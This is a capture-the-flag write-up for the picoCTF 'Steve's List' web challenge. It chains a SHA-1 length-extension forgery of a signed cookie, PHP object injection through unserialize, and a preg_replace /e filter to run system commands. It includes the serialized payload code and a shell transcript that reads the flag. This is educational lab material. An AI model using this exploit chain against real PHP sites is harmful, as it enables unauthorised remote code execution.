Challenge Name - CTF Name
===

###Problem: 

Section Chief Steve was super proud of the website he was writing, but he's pretty new to programming. When Daedalus Corp caught wind of this, they hacked [his site](http://steveslist.picoctf.com/). Steve still has an [old backup](https://picoctf.com/problem-static/web/steves-list/handout.zip), but they changed the secrets! They sent us a cryptic message saying they bet we couldn't read /home/daedalus/flag.txt. Can you go get it for us? 

###Analysis: 

A quick look through the source code of the website shows that the `custom_settings` cookie is parsed into an array of strings, which are then deserialized as PHP objects. If we can modify this cookie, we may be able to inject a PHP object:

```php
    $settings_array = explode("\n", $custom_settings);
    $custom_settings = array();
    for ($i = 0; $i < count($settings_array); $i++) {
      $setting = $settings_array[$i];
      $setting = unserialize($setting);
      $custom_settings[] = $setting;
    }
```
 
Unfortunately, the cookie is signed by the server using a SHA-1 hash of a secret value + the cookie. If the signature doesn't match, the server won't deserialize our object:

```php
    $hash = sha1(AUTH_SECRET . $custom_settings);
    if ($hash !== $_COOKIE['custom_settings_hash']) {
      die("Why would you hack Section Chief Steve's site? :(");
    }
```

Fortunately, the way the signature is calculated isn't secure. Using the cookie and signature pair that the server gives us, we can use a length-extension attack to make a new cookie with added data, and a valid signature for it, without knowing the secret. [HashPump](https://github.com/bwall/HashPump) is a good open-source program for doing this.

Now that we can inject PHP objects, the next step is to figure out a way to use this for our advantage. Unlike Python's pickle module, PHP's serialize won't just let us execute arbitrary code as-is. We'll have to exploit an existing class on the website by creating an instance which will do somethign dangerous. The Post class (in includes/classes.php) seems like a good target, because it implements the magic `__destruct` method which will be executed automatically when the object is destroyed:

```php
    function __destruct() {
      // debugging stuff
      $s = "<!-- POST " . htmlspecialchars($this->title);
      $text = htmlspecialchars($this->text);
      foreach ($this->filters as $filter)
        $text = $filter->filter($text);
      $s = $s . ": " . $text;
      $s = $s . " -->";
      echo $s;
    }
```

At first there's no obvious way to use this function to our advantage, but it turns out the `filter` function uses `preg_replace`, which will execute arbitrary PHP for us if the 'e' modifier is set (WTF PHP?).


###Solution: 

Construct a Post object that will run commands for us:

```php
$filters = array(new Filter('/.*/e', 'system($_GET["cmd"])'));
$post = new Post('', '', $filters);
echo bin2hex(serialize($post));
```

Use HashPump to append this value (seperated by a newline) to our cookie, with a valid signature.

Now we can run arbitrary system commands via the cmd parameter. shell.py uses this to present a rudimentary shell.

After a bit of searching the flag is easily found:

```
[joseph@jcmbp steves-list]$ python shell.py 
$ ls /home
daedalus
ubuntu
$ ls /home/daedalus
flag.txt
$ cat /home/daedalus/flag.txt
D43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve
```
